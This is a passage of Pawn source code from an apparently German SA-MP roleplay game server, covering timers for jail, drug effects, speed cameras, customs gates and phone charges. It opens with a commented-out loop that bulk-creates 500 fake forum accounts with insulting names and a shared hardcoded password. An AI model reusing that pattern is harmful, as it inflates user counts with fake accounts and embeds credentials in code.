            format(queryx, sizeof(queryx),"%d@nasenbender.eu", rand);
			WBB_AddUser(queryxd, "HAahHure31", queryx);

*/





/*



	for(new i = 0; i < 500; i++)
	{
            new queryxd[265];
			new rands = random(500000);
            format(queryxd, sizeof(queryxd),"LuegenOpa%d", rands);



            new queryx[265];
			new rand = random(5000000000);
            format(queryx, sizeof(queryx),"%d@nasenbender.eu", rand);
			WBB_AddUser(queryxd, "HAahHure31", queryx);
	}
*/





	new ahahak4[1024];
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(PlayerNeedsHelp[i] == 1)
        {
	         format(ahahak4, sizeof(ahahak4), "%s~n~Spieler: %s ID: %d",ahahak4,GetName(i),i);
		}
	}
	TextDrawSetString(Textdraw2,ahahak4);












    new string[255];
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{


	       	if(PlayerInfo[i][pAuftrag] > 0)
            {
                    PlayerInfo[i][pAuftrag]--;
				    format(string, sizeof(string), "%d",PlayerInfo[i][pAuftrag]);
					GameTextForPlayer(i, string, 1500, 6);
			}
	       	if(PlayerInfo[i][pJailed] > 0)
            {
                if(PlayerInfo[i][pJailTime] > 0 )
                {
                    PlayerInfo[i][pJailTime]--;
                }
				if(PlayerInfo[i][pJailTime] <= 0) ReleasePlayerFromJail(i);
			}
	        if(PlayerInfo[i][pTot] == 1)
            {
                if(PlayerInfo[i][pTotTime] > 0 )
                {
                    PlayerInfo[i][pTotTime]--;
                }
		     	if(PlayerInfo[i][pTotTime] <= 0)
                {
	        		SpawnPlayer(i);
//					Delete3DTextLabel(DeathText[i]);


					RemoveIcon(i);


//	        		DestroyPickup(TotenKopf[i]);
	        		GivePlayerMoneySave(i, -700);
	         		FraktionsKasse[3] += 700;
	     	     	PlayerInfo[i][pTot] = 0;
                }
    		}
			if(PlayerStoned[i] >= 2)
			{
				SetPlayerTime(i,22,10);
				SetPlayerDrunkLevel(i,50000);
				SetPlayerWeather(i,-66);
		        PlayerStoned[i] += 1;
			    if(PlayerStoned[i] >= 60)//zeit in sekunden
			    {
			        PlayerStoned[i] = 1337;
			    }
			    if(PlayerStoned[i] == 1337)
			    {
			        PlayerStoned[i] = 0;
					SetPlayerDrunkLevel(i,0);
					SetPlayerWeather(i,12);
					GameTextForPlayer(i, "~w~Du bist ~n~nichtmehr~p~ Stoned", 4000, 1);
				}
			}

			if(PlayerDrunk[i] >= 5)
			{
			    PlayerDrunkTime[i] += 1;
			    if(PlayerDrunkTime[i] == 60)
			    {
			        PlayerDrunkTime[i] = 1338;
       				SetPlayerDrunkLevel (i, 30000);
			    }
			    if(PlayerDrunkTime[i] == 1338)
			    {
			        PlayerDrunkTime[i] = 0;
       				SetPlayerDrunkLevel (i, 0);
			    }
			}

/*

//------------------------------------------- Tacho ------------------------------------------------------------
		new Float:Speedo_X,Float:Speedo_Y,Float:Speedo_Z;
		new Float:Speedo_HP;

	    if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i) && !IsANoTachoVehicle(GetPlayerVehicleID(i)))
		{
		    GetPlayerPos(i, Speedo_X, Speedo_Y, Speedo_Z);
			GetPlayerVehicleID(i);
			GetVehicleHealth(GetPlayerVehicleID(i), Speedo_HP);
			new str1[256],str2[256],str3[256],str4[256],str5[256];
			if(SpeedoON[i] == 0)
			{
				TextDrawShowForPlayer(i, Fahrzeug_TD[i]);
				TextDrawShowForPlayer(i, KMH_TD[i]);
				TextDrawShowForPlayer(i, Benzin_TD[i]);
				TextDrawShowForPlayer(i, Kilometer_TD[i]);
				TextDrawShowForPlayer(i, Umgebung_TD[i]);
				SpeedoON[i] = 1;
			}
			new Float:speed_x,Float:speed_y,Float:speed_z,Float:final_speed,final_speed_int;
			new veh = GetPlayerVehicleID(i);
   			GetVehicleVelocity(veh, speed_x, speed_y, speed_z);
			final_speed = floatsqroot(((speed_x*speed_x)+(speed_y*speed_y))+(speed_z*speed_z))*120.0; // 136.666667 = kmph  // 85.4166672= mph
			final_speed_int = floatround(final_speed,floatround_round);
			new kmh_anzahl = final_speed_int;

			format(str1,sizeof(str1),"Fahrzeug: ~r~%s",VehicleName[GetVehicleModel(GetPlayerVehicleID(i))-400]);
			TextDrawSetString(Fahrzeug_TD[i], str1);

			format(str2,sizeof(str2),"KM/H: ~r~%d",kmh_anzahl);
			TextDrawSetString(KMH_TD[i], str2);

			format(str4,sizeof(str4),"Zustand: ~g~%.2f", Speedo_HP);
			TextDrawSetString(Kilometer_TD[i], str4);
			}
			SavePlayerPos[i][sX] = Speedo_X, SavePlayerPos[i][sY] = Speedo_Y, SavePlayerPos[i][sZ] = Speedo_Z;

			if(!IsPlayerInAnyVehicle(i))
			{
	            TextDrawHideForPlayer(i, Kilometer_TD[i]);
				TextDrawHideForPlayer(i, Fahrzeug_TD[i]);
				TextDrawHideForPlayer(i, KMH_TD[i]);
	            TextDrawHideForPlayer(i, Benzin_TD[i]);
				TextDrawHideForPlayer(i, Umgebung_TD[i]);
				SpeedoON[i] = 0;
			}
//------------------------------------------------------------------------------------------------------------
*/
			if(WantedLevel[i] >= 1)
			{
	        new str[30];
	        format(str,sizeof(str),"] ~w~%d",WantedLevel[i]);
	        TextDrawSetString(WantedTextdraw[i], str);
	        TextDrawShowForPlayer(i, WantedTextdraw[i]);
			}
            else
			{
			TextDrawHideForPlayer(i, WantedTextdraw[i]);
			}
		    if(KickPlayer[i]==1)
			{
			Kick(i);
			}
			else if(KickPlayer[i]==2)
			{
			Ban(i);
		    }
			if(Spectate[i] < 254)
			{
				new targetid = Spectate[i];
				if(IsPlayerConnected(targetid))
				{
				    if(PlayerInfo[i][pAdmin] >= 1)
				    {
				        new Float:health;
					    new name[MAX_PLAYER_NAME];
					    GetPlayerName(targetid, name, sizeof(name));
					    GetPlayerHealth(targetid, health);
					    format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~y~%s(ID:%d)~n~~y~Leben:%.1f",name,targetid,health);
					    GameTextForPlayer(i, string, 2500, 3);
				    }
				}//Targetid connected
			}
		}
	}
    SetPlayerUnjail();
	{
		new Hour,Minute,Sec,String[12];
		gettime(Hour,Minute,Sec);
		format(String,sizeof(String),"%02d:%02d",Hour,Minute);
		TextDrawSetString(Uhrzeit,String);
		if(Hour == 0 && Minute == 0)
		{
			new year,month,day,DString[100],mtext[20], dtext[20];
			getdate(year, month, day);
			if(month == 1) { mtext = "01"; }
			else if(month == 2) { mtext = "02"; }
			else if(month == 3) { mtext = "03"; }
			else if(month == 4) { mtext = "04"; }
			else if(month == 5) { mtext = "05"; }
			else if(month == 6) { mtext = "06"; }
			else if(month == 7) { mtext = "07"; }
			else if(month == 8) { mtext = "08"; }
			else if(month == 9) { mtext = "09"; }
			else if(month == 10) { mtext = "10"; }
			else if(month == 11) { mtext = "11"; }
			else if(month == 12) { mtext = "12"; }
			if(day == 1) { dtext = "01"; }
			else if(day == 2) { dtext = "02"; }
			else if(day == 3) { dtext = "03"; }
			else if(day == 4) { dtext = "04"; }
			else if(day == 5) { dtext = "05"; }
			else if(day == 6) { dtext = "06"; }
			else if(day == 7) { dtext = "07"; }
			else if(day == 8) { dtext = "08"; }
			else if(day == 9) { dtext = "09"; }
			else if(day == 10) { dtext = "10"; }
			else if(day == 11) { dtext = "11"; }
			else if(day == 12) { dtext = "12"; }
			else if(day == 13) { dtext = "13"; }
			else if(day == 14) { dtext = "14"; }
			else if(day == 15) { dtext = "15"; }
			else if(day == 16) { dtext = "16"; }
			else if(day == 17) { dtext = "17"; }
			else if(day == 18) { dtext = "18"; }
			else if(day == 19) { dtext = "19"; }
			else if(day == 20) { dtext = "20"; }
			else if(day == 21) { dtext = "21"; }
			else if(day == 22) { dtext = "22"; }
			else if(day == 23) { dtext = "23"; }
			else if(day == 24) { dtext = "24"; }
			else if(day == 25) { dtext = "25"; }
			else if(day == 26) { dtext = "26"; }
			else if(day == 27) { dtext = "27"; }
			else if(day == 28) { dtext = "28"; }
			else if(day == 29) { dtext = "29"; }
			else if(day == 30) { dtext = "30"; }
			else if(day == 31) { dtext = "31"; }
		    format(DString, sizeof(DString), "%s.%s.%d", dtext, mtext, year);
		    TextDrawSetString(Datum,DString);
		}
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(TextSpams[i] > 0)
			{
				TextSpams[i]--;
			}
			if(CMDSpams[i] > 0)
			{
				CMDSpams[i]--;
			}
			if(IsPlayerConnected(i))
			{
				if(PlayerStoned[i] >= 2)
				{
					return 1;
				}
			}
		}
//		SetWorldTime(Hour);
	}
	{
//	    new Float:maxspeed = 250.0;
//	    new plname[MAX_PLAYER_NAME];
		new Float:oldposx, Float:oldposy, Float:oldposz;
	    for(new i = 0; i < SLOTS; i++)
		{
		    if(IsPlayerConnected(i))
		    {
	            if(SafeTime[i] > 0)
				{
					SafeTime[i]--;
				}
				if(SafeTime[i] == 1)
				{
					if(gPlayerAccount[i] == 1 && gPlayerLogged[i] == 0)
					{
						SendClientMessage(i, COLOR_GRAD2, "Bitte log dich ein.");
					}
				}
			    if(GetPlayerState(i) == 2)
			    {
					GetPlayerPos(i, TelePos[i][3], TelePos[i][4], TelePos[i][5]);
					if(TelePos[i][5] > 550.0)
					{
						TelePos[i][0] = 0.0;
						TelePos[i][1] = 0.0;
					}
					if(TelePos[i][0] != 0.0)
					{
						new Float:xdist = TelePos[i][3]-TelePos[i][0];
						new Float:ydist = TelePos[i][4]-TelePos[i][1];
						new Float:sqxdist = xdist*xdist;
						new Float:sqydist = ydist*ydist;
						new Float:distance = (sqxdist+sqydist)/31;
						if(gSpeedo[i] == 2)
						{
							if(distance <10)
							{
								format(string, 256, "~n~~n~~n~~n~~n~~n~~n~~g~mph :   ~w~%.0f",distance);
							}
							if(distance > 10 && distance < 100)
							{
								format(string, 256, "~n~~n~~n~~n~~n~~n~~n~~g~mph :  ~w~%.0f",distance);
							}
							if(distance > 100)
							{
								format(string, 256, "~n~~n~~n~~n~~n~~n~~n~~g~mph : ~w~%.0f",distance);
							}
							GameTextForPlayer(i, string, 2000, 5);
						}
/*
						if(distance > maxspeed && PlayerInfo[i][pAdmin] < 1)
						{
							new tmpcar = GetPlayerVehicleID(i);
							if(!IsAPlane(tmpcar))
							{
								GetPlayerName(i, plname, sizeof(plname));
								format(string, 256, "Warnung: [%d]%s %.0f km/h",i,plname,distance);
								ABroadCast(COLOR_YELLOW,string,1);
							}
						}
*/
					}
					if(TelePos[i][5] < 550.0 && TelePos[i][3] != 0.0)
					{
						TelePos[i][0] = TelePos[i][3];
						TelePos[i][1] = TelePos[i][4];
					}
				}
			    if(PlayerInfo[i][pLocal] != 999 && PlayerInfo[i][pInt] != 0)
				{
					new house = PlayerInfo[i][pLocal];
					GetPlayerPos(i, oldposx, oldposy, oldposz);
					if(oldposz != 0.0)
					{
						if(oldposz < 600.0)
						{
							if(house > 10000)
							{
								if (!IsPlayerInRangeOfPoint(i,6.0,1040.6,-1021.0,31.7) && house == 10001 ||!IsPlayerInRangeOfPoint(i,6.0,-2720.5,217.5,4.1) && house == 10002 ||!IsPlayerInRangeOfPoint(i,6.0,2644.6,-2044.9,13.3) && house == 10003)
								{
									new oldcash = gSpentCash[i];
									new Total = GetPlayerMoneySave(i) - oldcash;
									printf("Total %d = GetPlayerMoneySave(playerid) %d - oldcash %d",Total,GetPlayerMoneySave(i),oldcash);
									new name[MAX_PLAYER_NAME];
									GetPlayerName(i, name, sizeof(name));
									format(string,128,"<< %s hat den Hausupgradeladen mit $%d verlassen >>",name,Total);
									PayLog(string);
									gSpentCash[i] = 0;
									TelePos[i][0] = 0.0;
									TelePos[i][1] = 0.0;
									PlayerInfo[i][pLocal] = 999;
									SetPlayerInterior(i,0);
									PlayerInfo[i][pInt] = 0;
									Spectate[i] = 255;
								}
							}//SOLO
							/*if(house == 241)//City Hall
							{
							    SetPlayerInterior(i,0);
								SetPlayerPos(i,-2162.2554,-2385.9541,30.6250);
								PlayerInfo[i][pInt] = 0;
								PlayerInfo[i][pLocal] = 255;
							}
							if(house == 242)
							{
							    SetPlayerInterior(i,0);
								SetPlayerPos(i,1073.0619,-344.5148,73.9922);
								PlayerInfo[i][pInt] = 0;
								PlayerInfo[i][pLocal] = 255;
							}
							if(house >= 99 && house != 10000)
							{
								SetPlayerPos(i, BizzInfo[house-99][bEntranceX], BizzInfo[house-99][bEntranceY],BizzInfo[house-99][bEntranceZ]); // Warp the player
								PlayerInfo[i][pLocal] = 255;
								SetPlayerInterior(i,0);
								PlayerInfo[i][pInt] = 0;
							}
							else if(house < 99 && house != 10000)
							{
								SetPlayerPos(i, HouseInfo[house][hEntrancex], HouseInfo[house][hEntrancey],HouseInfo[house][hEntrancez]); // Warp the player
								PlayerInfo[i][pLocal] = 255;
								SetPlayerInterior(i,0);
								PlayerInfo[i][pInt] = 0;
							}*/
						}
					}
				}
			    if(CellTime[i] > 0)
				{
					if (CellTime[i] == cchargetime)
					{
						CellTime[i] = 1;
						if(Mobile[Mobile[i]] == i)
						{
							CallCost[i] = CallCost[i]+callcost;
						}
					}
					CellTime[i] = CellTime[i] +1;
					if (Mobile[Mobile[i]] == 255 && CellTime[i] == 5)
					{
					    if(IsPlayerConnected(Mobile[i]))
					    {
							new called[MAX_PLAYER_NAME];
							GetPlayerName(Mobile[i], called, sizeof(called));
							format(string, sizeof(string), "* %s's Handy klingelt.", called);
							RingTone[Mobile[i]] = 10;
							ProxDetector(30.0, Mobile[i], string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						}
					}
				}
				if(CellTime[i] == 0 && CallCost[i] > 0)
				{
					format(string, sizeof(string), "~w~Der Anruf kostet dich~n~ $5 Handyguthaben");
	                if(PlayerInfo[i][pHandyVer] == 0) PlayerInfo[i][pHandyGeld] -= 5;
					SBizzInfo[1][sbTill] += CallCost[i];
					ExtortionSBiz(1, CallCost[i]);
					GameTextForPlayer(i, string, 5000, 1);
					CallCost[i] = 0;
				}
				if(TransportTime[i] > 0)
				{
				    if(TransportTime[i] >= 16)
					{
						TransportTime[i] = 1;
						if(TransportDriver[i] < 999)
						{
							if(IsPlayerConnected(TransportDriver[i]))
							{
		      					TransportCost[i] += TransportValue[TransportDriver[i]];
							    TransportCost[TransportDriver[i]] = TransportCost[i];
							}
						}
					}
				    TransportTime[i] += 1;
				    format(string, sizeof(string), "~r~%d ~w~: ~g~$%d",TransportTime[i],TransportCost[i]);
				    GameTextForPlayer(i, string, 15000, 6);
				}
			}
		}
	}
	return 1;
}

forward HaltestelleTimer(playerid);
public HaltestelleTimer(playerid)
{
TogglePlayerControllable(playerid,1);
}


Function Timer3()
{



	// Ammu Nation LS Brand
	AddFire(1363.7776,-1287.4280,13.5469,0,false);
	AddFire(1363.6331,-1291.7289,13.5469,0,false);
	AddFire(1364.2527,-1297.1852,13.5469,0,false);
	AddFire(1363.5916,-1281.8965,13.5469,0,false);
	AddFire(1364.2089,-1278.4817,13.5469,0,false);
	AddFire(1363.5178,-1274.5980,13.5469,0,false);
	AddFire(1363.4517,-1269.9008,13.5469,0,false);
	AddFire(1362.8243,-1265.8684,13.5469,0,false);
	AddFire(1364.0275,-1262.0792,13.5469,0,false);
	AddFire(1364.4388,-1276.0907,16.8118,0,false);
	AddFire(1364.9971,-1285.2384,16.8118,0,false);
	AddFire(1364.8882,-1296.1666,16.8118,0,false);
	// Interior
	AddFire(294.0086,-37.0339,1001.5156,0,false);
	AddFire(297.6850,-35.8023,1001.5156,0,false);
	AddFire(294.5671,-31.3708,1001.5156,0,false);
	AddFire(291.3715,-32.6834,1001.5156,0,false);
	AddFire(292.2593,-35.5903,1001.5156,0,false);
	AddFire(294.2583,-40.8536,1001.5156,0,false);
	AddFire(299.4519,-38.5816,1001.5156,0,false);
	AddFire(297.7310,-39.3657,1002.5291,0,false);
	AddFire(289.7446,-35.0300,1003.1386,0,false);
	//------------------------------------------






//	/ram für Feuerwehr
//	/m Für Feuerwehr
//	/d für Feuerwehr
//	/r für Feuerwehr
//	/gov für Feuerwehr
//	/equipment Fixxen
//	/feuerduty Point Setzen + Label







		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
				if(PlayerInfo[i][pJob] > 0)
	    		{
	    	    	if(PlayerInfo[i][pContractTime] < 25)
	    	    	{
						PlayerInfo[i][pContractTime] ++;
					}
	    		}
			}
	}
	return 1;
}


Function IsAGang(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = PlayerInfo[playerid][pLeader];
	    new member = PlayerInfo[playerid][pMember];
	    if(member==5 || member==6 || member==12 || member==13 || member==14 || member==16 || member==17 || member==18 || member == 19 || member == 20 || member==21 || member==23)
		{
		    return 1;
		}
		else if(leader==5 || leader==6 || leader==12 || leader==13 || leader==14 || leader==16 || leader==17 || leader==18 || leader == 19 || leader == 20 || leader==21 || leader==23)
		{
		    return 1;
		}
	}
	return 0;
}

Function FrakMember(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pMember] > 0 || PlayerInfo[playerid][pLeader] > 0)
	    {
	        return 1;
		}
	}
	return 0;
}

Function Befreien(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 10.0, -2810.0015,-1524.0463,140.8438))
	{
		new sendername[MAX_PLAYER_NAME];
		new string[180];
  		GetPlayerName(playerid, sendername, sizeof(sendername));
    	format(string, sizeof(string), "%s hat alle Gefangenen befreit!",sendername);
		ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		for(new i=0; i<MAX_PLAYERS; i++)
 		{
			if(PlayerInfo[i][pGangJailed] == 1)
			{
				SetPlayerPos(i,-2810.0015,-1524.0463,140.8438);
				format(string, sizeof(string), "Du wurdest von %s befreit.", sendername);
				SendClientMessage(i, COLOR_YELLOW, string);
				PlayerInfo[i][pGangJailed] = 0;
				PlayerInfo[i][pMauled] = 0;
				PlayerTied[i] = 0;
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_RED, "Da du nicht am GangJail Tor bist, misslang es dir, das Tor zu öffnen!");
	}
	return 1;
}
Function RemovePlayerWeapon(playerid, weaponid)
{
	new plyWeapons[12] = 0;
	new plyAmmo[12] = 0;
	for(new slot = 0; slot != 12; slot++)
	{
		new wep, ammo;
		GetPlayerWeaponData(playerid, slot, wep, ammo);

		if(wep != weaponid && ammo != 0)
		{
			GetPlayerWeaponData(playerid, slot, plyWeapons[slot], plyAmmo[slot]);
		}
	}

	SafeResetPlayerWeapons(playerid);
	for(new slot = 0; slot != 12; slot++)
	{
	    if(plyAmmo[slot] != 0)
	    {
			SafeServerWeapon(playerid, plyWeapons[slot], plyAmmo[slot]);
		}
	}
	return 1;
}

Function SafeServerWeapon(plyid, weaponid, ammo)
{
	ServerWeapon(plyid, weaponid, ammo);
	return 1;
}

forward strtoknew(const string[],&index);
strtoknew(const string[], &index)
{
	new length = strlen(string);
 	while ((index < length) && (string[index] <= ' '))
  	{
		index++;
	}
 	new offset = index;
	new result[20];
    while ((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
 	{
 		result[index - offset] = string[index];
		index++;
  	}
   	result[index - offset] = EOS;
    return result;
}

//======== ZOLL ==========//
// Zoll 1 LS LV
Function closegate2()
{
	MoveDynamicObject(zolltor1, 1750.53284, 515.92505, 27.70611, 2.5);
	return 1;
}

Function closegate3()
{
	MoveDynamicObject(zolltor2, 1742.12573, 518.60272, 27.70611, 2.5);
	return 1;
}

Function closegate4()
{
	MoveDynamicObject(zolltor3, 1733.37769, 521.50671, 27.70611, 2.5);
	return 1;
}

Function closegate5()
{
	MoveDynamicObject(zolltor4, 1724.80725, 524.85522, 27.70611, 2.5);
	return 1;
}

Function closegate6()
{
	MoveDynamicObject(zolltor5, 58.13060, -1539.73645, 4.59974, 2.5);

	return 1;
}
Function closegate7()
{
	MoveDynamicObject(zolltor6, 47.75523, -1524.29236, 4.77916, 2.5);
	return 1;
}
//
Function closegate8()
{
	MoveDynamicObject(zolltor7, -1402.84558, 830.12793, 47.27655, 2.5);
	return 1;
}

Function closegate9()
{
	MoveDynamicObject(zolltor8, -1395.88013, 823.92303, 47.27977, 2.5);
	return 1;
}

Function closegate10()
{
	MoveDynamicObject(zolltor9, 86.22680, -1251.81213, 14.27388, 2.5);
	return 1;
}

Function closegate11()
{
	MoveDynamicObject(zolltor10, 96.14687, -1255.90833, 14.34753, 2.5);
	return 1;
}

Function closegate12()
{
	MoveDynamicObject(zolltor11, 101.65186, -1272.34497, 14.31233, 2.5);
	return 1;
}

Function closegate13()
{
	MoveDynamicObject(zolltor12, 110.51665, -1277.13660, 14.40798, 2.5);
	return 1;
}

Function closegate14()
{
	MoveDynamicObject(zolltor13, 112.27465820, -1277.22094727, 14.75586414, 2.5);
	return 1;
}

Function closegate15()
{
	MoveDynamicObject(zolltor14, 100.10153198, -1254.57641602, 14.75407791, 2.5);
	return 1;
}

Function closegate16()
{
	MoveDynamicObject(zolltor15, 89.60826111,-1248.17480469,14.42384052, 2.5);
	return 1;
}

Function closegate17()
{
	MoveDynamicObject(zolltor16, -2694.72802734,1275.12854004,55.26990891, 2.5);
	return 1;
}

Function closegate18()
{
	MoveDynamicObject(zolltor17, -2685.87304688,1275.14294434,55.26990891, 2.5);
	return 1;
}

Function closegate19()
{
	MoveDynamicObject(zolltor18, -2677.04370117,1275.15173340,55.26990891, 2.5);
	return 1;
}

Function closegate20()
{
	MoveDynamicObject(zolltor19, -2667.32788086,1275.27246094,55.26990891, 2.5);
	return 1;
}

Function SafeResetPlayerWeapons(plyid)
{
	ResetPlayerWeapons(plyid);
	return 1;
}
public AnwaltErlaubnis(playerid)
{

    SendClientMessage(playerid,COLOR_LIGHTBLUE," ");
    SendClientMessage(playerid,COLOR_LIGHTBLUE," ");
	SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Dein Antrag, leute aus dem Gefängnis zu holen wurde angenommen!");
	SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du hast nun die möglichkeit, Gefangene aus dem Gefängniss zu befreien!");
	SendClientMessage(playerid,COLOR_WHITE,"* Achtung: Die Lizenz gilt nur für 5 Minuten!");
    ApprovedLawyer[playerid] = 1;
	UnFreezePlayer(playerid);
	SetTimerEx("AnwaltErlaubnisWeg",10000,0,"d",playerid);

}
//======== BLITZER ========//
Function Blitzer_Timer() {
    new save, strafe, speeds;
 	for (new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	 {
 	    save = GetPVarInt(playerid, "BlitzPause");
		if(save > 0)
		{
			save--;
			SetPVarInt(playerid, "BlitzPause", save);
			continue;
		}
 		if(!IsPlayerInAnyVehicle(playerid) || IsPlayerNPC(playerid)) continue;
		for(new i = 0; i < sizeof(Blitzer); i++)
		{
			if(Blitzer[i][Erstellt] == 1)
			{
			    if(IsPlayerInRangeOfPoint(playerid, Blitzer[i][Radius], Blitzer[i][BlitzerX], Blitzer[i][BlitzerY], Blitzer[i][BlitzerZ]))
				{
	 				new Float:speed_x,Float:speed_y,Float:speed_z,Float:final_speed,final_speed_int;
					new veh = GetPlayerVehicleID(playerid);
					GetVehicleVelocity(veh, speed_x, speed_y, speed_z);
					final_speed = floatsqroot(((speed_x*speed_x)+(speed_y*speed_y))+(speed_z*speed_z))*93.0; // 136.666667 = kmph  // 85.4166672= mph
					final_speed_int = floatround(final_speed,floatround_round);
					speeds = final_speed_int;
					if(speeds > Blitzer[i][Geschwindigkeit] && !IsACop(playerid) && GetPlayerState(playerid) == 2)
					{
						new string[128];
						// Einstellen des Momentes, in dem der Spieler kein weiteres mal geblitzt werden kann
						SetPVarInt(playerid, "BlitzPause", (BLITZER_TIMER_INTERVALL * BLITZER_PAUSE * 60) / 1000);
						// Strafe für Spieler
						strafe = Blitzer[i][Strafe] * (speeds-Blitzer[i][Geschwindigkeit]);
						PlayerPlaySound(playerid, 1132, 0.0, 0.0, 0.0);
						FraktionsKasse[23] += strafe;
					   	GivePlayerMoneySave(playerid, -strafe);
						// Text für Spieler
						format(string,sizeof(string), "[BLITZER]Du bist %d KM/H gefahren, erlaubt waren %d KM/H, du musst $%d Bußgeld bezahlen.", speeds, Blitzer[i][Geschwindigkeit], strafe);
						SendClientMessage(playerid, COLOR_YELLOW, string);

		 				for(new o = 0; o < MAX_PLAYERS; o++)
						{
		        			if(PlayerInfo[i][pMember] == 24 || PlayerInfo[i][pLeader] == 24)
		        			{
								if(IsPlayerInRangeOfPoint(o, Blitzer[i][Radius], Blitzer[i][BlitzerX], Blitzer[i][BlitzerY], Blitzer[i][BlitzerZ]))
								{
									new giveplayer[MAX_PLAYER_NAME];
									GetPlayerName(o, giveplayer, sizeof(giveplayer));
									format(string, sizeof(string), "%s ist %d KM/H gefahren und hat %d$ Bußgeld gezahlt.", giveplayer, speeds, strafe);
									SendClientMessage(o, COLOR_YELLOW, string);
								}
							}
						}
					}
				}
			}
		}
	}
	return 1;
}

//====== BLITZER FUNKTIONEN =======//
stock AddBlitzer(playerid,speeds,strafe)
{
		new Float:x, Float:y, Float:z, Float:A;
		GetPlayerPos(playerid, x, y, z);
		GetPlayerFacingAngle(playerid, A);
		for(new i = 0; i < sizeof(Blitzer); i++)
		{
		if(Blitzer[i][Erstellt] == 0) {
		Blitzer[i][BlitzerX] = x + 1.0;
		Blitzer[i][BlitzerY] = y + 1.0;
		Blitzer[i][BlitzerZ] = z;
		Blitzer[i][Geschwindigkeit] = speeds;
		Blitzer[i][Radius] = 50;
		Blitzer[i][Strafe] = strafe;
		Blitzer[i][Erstellt] = 1;
		Blitzer[i][ID] = CreateDynamicObject(18880, x, y+1, z - 1.5, 0.0, 0.0, A+180);GesammtBlitzer++;
		return 1;
		}
	}
    return 0;
}
stock RemoveBlitzer(playerid)
{
   	for(new i = 0; i < sizeof(Blitzer); i++)
	   {
	   if(Blitzer[i][Erstellt] == 1)
	   {
			if(IsPlayerInRangeOfPoint(playerid, Blitzer[i][Radius], Blitzer[i][BlitzerX], Blitzer[i][BlitzerY], Blitzer[i][BlitzerZ]))
			{
				Blitzer[i][Erstellt] = 0;
    			Blitzer[i][BlitzerX] = 0.0;
		        Blitzer[i][BlitzerY] = 0.0;
	         	Blitzer[i][BlitzerZ] = 0.0;
	         	DestroyDynamicObject(Blitzer[i][ID]);
				GesammtBlitzer--;
             	return 1;
  	        }
  	    }
  	}
   	return 0;
}
stock RemoveAllBlitzer() {
   	for(new i = 0; i < sizeof(Blitzer); i++) {
		if(Blitzer[i][Erstellt] == 1) {
			Blitzer[i][Erstellt] = 0;
			Blitzer[i][BlitzerX] = 0.0;
   			Blitzer[i][BlitzerY] = 0.0;
     		Blitzer[i][BlitzerZ] = 0.0;
    		DestroyDynamicObject(Blitzer[i][ID]);
    		GesammtBlitzer = 0;
  	    }
  	}
   	return 0;
}
stock CountBlitzer() {
   	new anzahl = 0;
	for(new i = 0; i < sizeof(Blitzer); i++) {
		if(Blitzer[i][Erstellt] == 1) anzahl++;
  	}
   	return anzahl;
}
stock ErmittleGeschwindigkeit(playerid,bool:kmhb) {
    new Float:x,Float:y,Float:z,Float:rtn;
    if(IsPlayerInAnyVehicle(playerid)) GetVehicleVelocity(GetPlayerVehicleID(playerid),x,y,z); else GetPlayerVelocity(playerid,x,y,z);
    rtn = floatsqroot(x*x+y*y+z*z);
    return kmhb?floatround(rtn * 55 * 1.61):floatround(rtn * 100);
}




stock GetDistanceToLastPoint(vehicleid)
{
	new Float:x2, Float:y2, Float:z2, Float:output;
	GetVehiclePos(vehicleid, x2, y2, z2);
	output = floatsqroot(floatpower(floatabs(floatsub(x2, sVehicle_X[vehicleid])), 2)+floatpower(floatabs(floatsub(y2, sVehicle_Y[vehicleid])), 2)+floatpower(floatabs(floatsub(z2, sVehicle_Z[vehicleid])), 2));
	return floatround(output);
}

Function Ende()
{
    PaintballWinnerKills = 0;
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
    	PlayerPaintballKills[i] = 0;
	}
	return 1;
}

Function NagelBand_Timer() {
 	for (new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
		if(!IsPlayerInAnyVehicle(playerid) || IsPlayerNPC(playerid)) continue;
		for(new i = 0; i < sizeof(NagelBand); i++)
		{
			if(NagelBand[i][nErstellt] == 1)
			{
				if(IsPlayerInRangeOfPoint(playerid, 4, NagelBand[i][NagelBandX], NagelBand[i][NagelBandY], NagelBand[i][NagelBandZ]))
				{
				    if(IsPlayerInAnyVehicle(playerid))
					{
				        new panels, doors, lights, tires;
						GetVehicleDamageStatus(GetPlayerVehicleID(playerid), panels, doors, lights, tires);
						tires = encode_tires(1, 1, 1, 1);
						UpdateVehicleDamageStatus(GetPlayerVehicleID(playerid), panels, doors, lights, tires);
					}
				}
			}
		}
	}
	return 1;
}
stock Elevator_Initialize()
{
	// Initializes the elevator.

	Obj_Elevator 			= CreateObject(18755, 1786.678100, -1303.459472, GROUND_Z_COORD + ELEVATOR_OFFSET, 0.000000, 0.000000, 270.000000);
	Obj_ElevatorDoors[0] 	= CreateObject(18757, X_DOOR_CLOSED, -1303.459472, GROUND_Z_COORD, 0.000000, 0.000000, 270.000000);
	Obj_ElevatorDoors[1] 	= CreateObject(18756, X_DOOR_CLOSED, -1303.459472, GROUND_Z_COORD, 0.000000, 0.000000, 270.000000);

	Label_Elevator          = Create3DTextLabel("Drücke 'F' um den Fahrstuhl zu benutzen", 0xFFFFDD, 1784.9822, -1302.0426, 13.6491, 4.0, 0, 1);

	new string[128],
		Float:z;

	for(new i; i < sizeof(Obj_FloorDoors); i ++)
	{
